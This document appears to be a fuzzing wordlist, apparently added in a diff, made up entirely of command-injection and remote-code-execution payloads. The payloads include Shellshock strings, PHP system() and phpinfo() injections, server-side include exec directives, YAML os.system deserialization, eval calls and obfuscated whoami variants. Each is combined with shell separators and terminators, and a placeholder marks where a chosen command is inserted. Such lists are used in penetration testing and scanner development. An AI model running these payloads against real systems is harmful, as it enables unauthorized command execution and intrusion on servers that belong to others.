+||{${phpinfo()}}||
+||{${phpinfo()}};
+||{${phpinfo()}}%00
+||{${phpinfo()}}#
+||${@print("RCEVulnerable")}&
+||${@print("RCEVulnerable")}&&
+||${@print("RCEVulnerable")}|
+||${@print("RCEVulnerable")}||
+||${@print("RCEVulnerable")};
+||${@print("RCEVulnerable")}%00
+||${@print("RCEVulnerable")}#
+||/usr/bin/id&
+||/usr/bin/id&&
+||/usr/bin/id|
+||/usr/bin/id||
+||/usr/bin/id;
+||/usr/bin/id%00
+||/usr/bin/id#
+||{2136} + {1}&
+||{2136} + {1}&&
+||{2136} + {1}|
+||{2136} + {1}||
+||{2136} + {1};
+||{2136} + {1}%00
+||{2136} + {1}#
+||{2136+1}&
+||{2136+1}&&
+||{2136+1}|
+||{2136+1}||
+||{2136+1};
+||{2136+1}%00
+||{2136+1}#
+||() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"&
+||() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"&&
+||() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"|
+||() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"||
+||() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!";
+||() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"%00
+||() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"#
+||() { :;}; !-VARIABLE_COMMAND-!&
+||() { :;}; !-VARIABLE_COMMAND-!&&
+||() { :;}; !-VARIABLE_COMMAND-!|
+||() { :;}; !-VARIABLE_COMMAND-!||
+||() { :;}; !-VARIABLE_COMMAND-!;
+||() { :;}; !-VARIABLE_COMMAND-!%00
+||() { :;}; !-VARIABLE_COMMAND-!#
+||eval('!-VARIABLE_COMMAND-!')&
+||eval('!-VARIABLE_COMMAND-!')&&
+||eval('!-VARIABLE_COMMAND-!')|
+||eval('!-VARIABLE_COMMAND-!')||
+||eval('!-VARIABLE_COMMAND-!');
+||eval('!-VARIABLE_COMMAND-!')%00
+||eval('!-VARIABLE_COMMAND-!')#
+||<!--#exec cmd="/usr/bin/id;-->&
+||<!--#exec cmd="/usr/bin/id;-->&&
+||<!--#exec cmd="/usr/bin/id;-->|
+||<!--#exec cmd="/usr/bin/id;-->||
+||<!--#exec cmd="/usr/bin/id;-->;
+||<!--#exec cmd="/usr/bin/id;-->%00
+||<!--#exec cmd="/usr/bin/id;-->#
+||perl -e 'print "X"x8192'&
+||perl -e 'print "X"x8192'&&
+||perl -e 'print "X"x8192'|
+||perl -e 'print "X"x8192'||
+||perl -e 'print "X"x8192';
+||perl -e 'print "X"x8192'%00
+||perl -e 'print "X"x8192'#
+||<?php system("!-VARIABLE_COMMAND-!");?>&
+||<?php system("!-VARIABLE_COMMAND-!");?>&&
+||<?php system("!-VARIABLE_COMMAND-!");?>|
+||<?php system("!-VARIABLE_COMMAND-!");?>||
+||<?php system("!-VARIABLE_COMMAND-!");?>;
+||<?php system("!-VARIABLE_COMMAND-!");?>%00
+||<?php system("!-VARIABLE_COMMAND-!");?>#
+||!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]&
+||!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]&&
+||!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]|
+||!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]||
+||!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"];
+||!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]%00
+||!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]#
+||w\ho\am\i&
+||w\ho\am\i&&
+||w\ho\am\i|
+||w\ho\am\i||
+||w\ho\am\i;
+||w\ho\am\i%00
+||w\ho\am\i#
+||w'h'o'am'i&
+||w'h'o'am'i&&
+||w'h'o'am'i|
+||w'h'o'am'i||
+||w'h'o'am'i;
+||w'h'o'am'i%00
+||w'h'o'am'i#
+||system('!-VARIABLE_COMMAND-!')&
+||system('!-VARIABLE_COMMAND-!')&&
+||system('!-VARIABLE_COMMAND-!')|
+||system('!-VARIABLE_COMMAND-!')||
+||system('!-VARIABLE_COMMAND-!');
+||system('!-VARIABLE_COMMAND-!')%00
+||system('!-VARIABLE_COMMAND-!')#
+&!-VARIABLE_COMMAND-!&
+&!-VARIABLE_COMMAND-!&&
+&!-VARIABLE_COMMAND-!|
+&!-VARIABLE_COMMAND-!||
+&!-VARIABLE_COMMAND-!;
+&!-VARIABLE_COMMAND-!%00
+&!-VARIABLE_COMMAND-!#
+&`!-VARIABLE_COMMAND-!`&
+&`!-VARIABLE_COMMAND-!`&&
+&`!-VARIABLE_COMMAND-!`|
+&`!-VARIABLE_COMMAND-!`||
+&`!-VARIABLE_COMMAND-!`;
+&`!-VARIABLE_COMMAND-!`%00
+&`!-VARIABLE_COMMAND-!`#
+&(!-VARIABLE_COMMAND-!)&
+&(!-VARIABLE_COMMAND-!)&&
+&(!-VARIABLE_COMMAND-!)|
+&(!-VARIABLE_COMMAND-!)||
+&(!-VARIABLE_COMMAND-!);
+&(!-VARIABLE_COMMAND-!)%00
+&(!-VARIABLE_COMMAND-!)#
+&$(!-VARIABLE_COMMAND-!)&
+&$(!-VARIABLE_COMMAND-!)&&
+&$(!-VARIABLE_COMMAND-!)|
+&$(!-VARIABLE_COMMAND-!)||
+&$(!-VARIABLE_COMMAND-!);
+&$(!-VARIABLE_COMMAND-!)%00
+&$(!-VARIABLE_COMMAND-!)#
+&{!-VARIABLE_COMMAND-!}&
+&{!-VARIABLE_COMMAND-!}&&
+&{!-VARIABLE_COMMAND-!}|
+&{!-VARIABLE_COMMAND-!}||
+&{!-VARIABLE_COMMAND-!};
+&{!-VARIABLE_COMMAND-!}%00
+&{!-VARIABLE_COMMAND-!}#
+&$(`!-VARIABLE_COMMAND-!`)&
+&$(`!-VARIABLE_COMMAND-!`)&&
+&$(`!-VARIABLE_COMMAND-!`)|
+&$(`!-VARIABLE_COMMAND-!`)||
+&$(`!-VARIABLE_COMMAND-!`);
+&$(`!-VARIABLE_COMMAND-!`)%00
+&$(`!-VARIABLE_COMMAND-!`)#
+&{${phpinfo()}}&
+&{${phpinfo()}}&&
+&{${phpinfo()}}|
+&{${phpinfo()}}||
+&{${phpinfo()}};
+&{${phpinfo()}}%00
+&{${phpinfo()}}#
+&${@print("RCEVulnerable")}&
+&${@print("RCEVulnerable")}&&
+&${@print("RCEVulnerable")}|
+&${@print("RCEVulnerable")}||
+&${@print("RCEVulnerable")};
+&${@print("RCEVulnerable")}%00
+&${@print("RCEVulnerable")}#
+&/usr/bin/id&
+&/usr/bin/id&&
+&/usr/bin/id|
+&/usr/bin/id||
+&/usr/bin/id;
+&/usr/bin/id%00
+&/usr/bin/id#
+&{2136} + {1}&
+&{2136} + {1}&&
+&{2136} + {1}|
+&{2136} + {1}||
+&{2136} + {1};
+&{2136} + {1}%00
+&{2136} + {1}#
+&{2136+1}&
+&{2136+1}&&
+&{2136+1}|
+&{2136+1}||
+&{2136+1};
+&{2136+1}%00
+&{2136+1}#
+&() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"&
+&() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"&&
+&() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"|
+&() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"||
+&() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!";
+&() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"%00
+&() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"#
+&() { :;}; !-VARIABLE_COMMAND-!&
+&() { :;}; !-VARIABLE_COMMAND-!&&
+&() { :;}; !-VARIABLE_COMMAND-!|
+&() { :;}; !-VARIABLE_COMMAND-!||
+&() { :;}; !-VARIABLE_COMMAND-!;
+&() { :;}; !-VARIABLE_COMMAND-!%00
+&() { :;}; !-VARIABLE_COMMAND-!#
+&eval('!-VARIABLE_COMMAND-!')&
+&eval('!-VARIABLE_COMMAND-!')&&
+&eval('!-VARIABLE_COMMAND-!')|
+&eval('!-VARIABLE_COMMAND-!')||
+&eval('!-VARIABLE_COMMAND-!');
+&eval('!-VARIABLE_COMMAND-!')%00
+&eval('!-VARIABLE_COMMAND-!')#
+&<!--#exec cmd="/usr/bin/id;-->&
+&<!--#exec cmd="/usr/bin/id;-->&&
+&<!--#exec cmd="/usr/bin/id;-->|
+&<!--#exec cmd="/usr/bin/id;-->||
+&<!--#exec cmd="/usr/bin/id;-->;
+&<!--#exec cmd="/usr/bin/id;-->%00
+&<!--#exec cmd="/usr/bin/id;-->#
+&perl -e 'print "X"x8192'&
+&perl -e 'print "X"x8192'&&
+&perl -e 'print "X"x8192'|
+&perl -e 'print "X"x8192'||
+&perl -e 'print "X"x8192';
+&perl -e 'print "X"x8192'%00
+&perl -e 'print "X"x8192'#
+&<?php system("!-VARIABLE_COMMAND-!");?>&
+&<?php system("!-VARIABLE_COMMAND-!");?>&&
+&<?php system("!-VARIABLE_COMMAND-!");?>|
+&<?php system("!-VARIABLE_COMMAND-!");?>||
+&<?php system("!-VARIABLE_COMMAND-!");?>;
+&<?php system("!-VARIABLE_COMMAND-!");?>%00
+&<?php system("!-VARIABLE_COMMAND-!");?>#
+&!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]&
+&!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]&&
+&!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]|
+&!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]||
+&!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"];
+&!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]%00
+&!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]#
+&w\ho\am\i&
+&w\ho\am\i&&
+&w\ho\am\i|
+&w\ho\am\i||
+&w\ho\am\i;
+&w\ho\am\i%00
+&w\ho\am\i#
+&w'h'o'am'i&
+&w'h'o'am'i&&
+&w'h'o'am'i|
+&w'h'o'am'i||
+&w'h'o'am'i;
+&w'h'o'am'i%00
+&w'h'o'am'i#
+&system('!-VARIABLE_COMMAND-!')&
+&system('!-VARIABLE_COMMAND-!')&&
+&system('!-VARIABLE_COMMAND-!')|
+&system('!-VARIABLE_COMMAND-!')||
+&system('!-VARIABLE_COMMAND-!');
+&system('!-VARIABLE_COMMAND-!')%00
+&system('!-VARIABLE_COMMAND-!')#
+&&!-VARIABLE_COMMAND-!&
+&&!-VARIABLE_COMMAND-!&&
+&&!-VARIABLE_COMMAND-!|
+&&!-VARIABLE_COMMAND-!||
+&&!-VARIABLE_COMMAND-!;
+&&!-VARIABLE_COMMAND-!%00
+&&!-VARIABLE_COMMAND-!#
+&&`!-VARIABLE_COMMAND-!`&
+&&`!-VARIABLE_COMMAND-!`&&
+&&`!-VARIABLE_COMMAND-!`|
+&&`!-VARIABLE_COMMAND-!`||
+&&`!-VARIABLE_COMMAND-!`;
+&&`!-VARIABLE_COMMAND-!`%00
+&&`!-VARIABLE_COMMAND-!`#
+&&(!-VARIABLE_COMMAND-!)&
+&&(!-VARIABLE_COMMAND-!)&&
+&&(!-VARIABLE_COMMAND-!)|
+&&(!-VARIABLE_COMMAND-!)||
+&&(!-VARIABLE_COMMAND-!);
+&&(!-VARIABLE_COMMAND-!)%00
+&&(!-VARIABLE_COMMAND-!)#
+&&$(!-VARIABLE_COMMAND-!)&
+&&$(!-VARIABLE_COMMAND-!)&&
+&&$(!-VARIABLE_COMMAND-!)|
+&&$(!-VARIABLE_COMMAND-!)||
+&&$(!-VARIABLE_COMMAND-!);
+&&$(!-VARIABLE_COMMAND-!)%00
+&&$(!-VARIABLE_COMMAND-!)#
+&&{!-VARIABLE_COMMAND-!}&
+&&{!-VARIABLE_COMMAND-!}&&
+&&{!-VARIABLE_COMMAND-!}|
+&&{!-VARIABLE_COMMAND-!}||
+&&{!-VARIABLE_COMMAND-!};
+&&{!-VARIABLE_COMMAND-!}%00
+&&{!-VARIABLE_COMMAND-!}#
+&&$(`!-VARIABLE_COMMAND-!`)&
+&&$(`!-VARIABLE_COMMAND-!`)&&
+&&$(`!-VARIABLE_COMMAND-!`)|
+&&$(`!-VARIABLE_COMMAND-!`)||
+&&$(`!-VARIABLE_COMMAND-!`);
+&&$(`!-VARIABLE_COMMAND-!`)%00
+&&$(`!-VARIABLE_COMMAND-!`)#
+&&{${phpinfo()}}&
+&&{${phpinfo()}}&&
+&&{${phpinfo()}}|
+&&{${phpinfo()}}||
+&&{${phpinfo()}};
+&&{${phpinfo()}}%00
+&&{${phpinfo()}}#
+&&${@print("RCEVulnerable")}&
+&&${@print("RCEVulnerable")}&&
+&&${@print("RCEVulnerable")}|
+&&${@print("RCEVulnerable")}||
+&&${@print("RCEVulnerable")};
+&&${@print("RCEVulnerable")}%00
+&&${@print("RCEVulnerable")}#
+&&/usr/bin/id&
+&&/usr/bin/id&&
+&&/usr/bin/id|
+&&/usr/bin/id||
+&&/usr/bin/id;
+&&/usr/bin/id%00
+&&/usr/bin/id#
+&&{2136} + {1}&
+&&{2136} + {1}&&
+&&{2136} + {1}|
+&&{2136} + {1}||
+&&{2136} + {1};
+&&{2136} + {1}%00
+&&{2136} + {1}#
+&&{2136+1}&
+&&{2136+1}&&
+&&{2136+1}|
+&&{2136+1}||
+&&{2136+1};
+&&{2136+1}%00
+&&{2136+1}#
+&&() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"&
+&&() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"&&
+&&() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"|
+&&() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"||
+&&() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!";
+&&() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"%00
+&&() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"#
+&&() { :;}; !-VARIABLE_COMMAND-!&
+&&() { :;}; !-VARIABLE_COMMAND-!&&
+&&() { :;}; !-VARIABLE_COMMAND-!|
+&&() { :;}; !-VARIABLE_COMMAND-!||
+&&() { :;}; !-VARIABLE_COMMAND-!;
+&&() { :;}; !-VARIABLE_COMMAND-!%00
+&&() { :;}; !-VARIABLE_COMMAND-!#
+&&eval('!-VARIABLE_COMMAND-!')&
+&&eval('!-VARIABLE_COMMAND-!')&&
+&&eval('!-VARIABLE_COMMAND-!')|
+&&eval('!-VARIABLE_COMMAND-!')||
+&&eval('!-VARIABLE_COMMAND-!');
+&&eval('!-VARIABLE_COMMAND-!')%00
+&&eval('!-VARIABLE_COMMAND-!')#
+&&<!--#exec cmd="/usr/bin/id;-->&
+&&<!--#exec cmd="/usr/bin/id;-->&&
+&&<!--#exec cmd="/usr/bin/id;-->|
+&&<!--#exec cmd="/usr/bin/id;-->||
+&&<!--#exec cmd="/usr/bin/id;-->;
+&&<!--#exec cmd="/usr/bin/id;-->%00
+&&<!--#exec cmd="/usr/bin/id;-->#
+&&perl -e 'print "X"x8192'&
+&&perl -e 'print "X"x8192'&&
+&&perl -e 'print "X"x8192'|
+&&perl -e 'print "X"x8192'||
+&&perl -e 'print "X"x8192';
+&&perl -e 'print "X"x8192'%00
+&&perl -e 'print "X"x8192'#
+&&<?php system("!-VARIABLE_COMMAND-!");?>&
+&&<?php system("!-VARIABLE_COMMAND-!");?>&&
+&&<?php system("!-VARIABLE_COMMAND-!");?>|
+&&<?php system("!-VARIABLE_COMMAND-!");?>||
+&&<?php system("!-VARIABLE_COMMAND-!");?>;
+&&<?php system("!-VARIABLE_COMMAND-!");?>%00
+&&<?php system("!-VARIABLE_COMMAND-!");?>#
+&&!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]&
+&&!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]&&
+&&!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]|
+&&!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]||
+&&!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"];
+&&!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]%00
+&&!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]#
+&&w\ho\am\i&
+&&w\ho\am\i&&
+&&w\ho\am\i|
+&&w\ho\am\i||
+&&w\ho\am\i;
+&&w\ho\am\i%00
+&&w\ho\am\i#
+&&w'h'o'am'i&
+&&w'h'o'am'i&&
+&&w'h'o'am'i|
+&&w'h'o'am'i||
+&&w'h'o'am'i;
+&&w'h'o'am'i%00
+&&w'h'o'am'i#
+&&system('!-VARIABLE_COMMAND-!')&
+&&system('!-VARIABLE_COMMAND-!')&&
+&&system('!-VARIABLE_COMMAND-!')|
+&&system('!-VARIABLE_COMMAND-!')||
+&&system('!-VARIABLE_COMMAND-!');
+&&system('!-VARIABLE_COMMAND-!')%00
+&&system('!-VARIABLE_COMMAND-!')#
+!-VARIABLE_COMMAND-!
+`!-VARIABLE_COMMAND-!`
+(!-VARIABLE_COMMAND-!)
+$(!-VARIABLE_COMMAND-!)
+{!-VARIABLE_COMMAND-!}
+$(`!-VARIABLE_COMMAND-!`)
+{${phpinfo()}}
+${@print("RCEVulnerable")}
+/usr/bin/id
+{2136} + {1}
+{2136+1}
+() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"
+() { :;}; !-VARIABLE_COMMAND-!
+eval('!-VARIABLE_COMMAND-!')
+<!--#exec cmd="/usr/bin/id;-->
+perl -e 'print "X"x8192'
+<?php system("!-VARIABLE_COMMAND-!");?>
+!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]
+w\ho\am\i
+w'h'o'am'i
+system('!-VARIABLE_COMMAND-!')
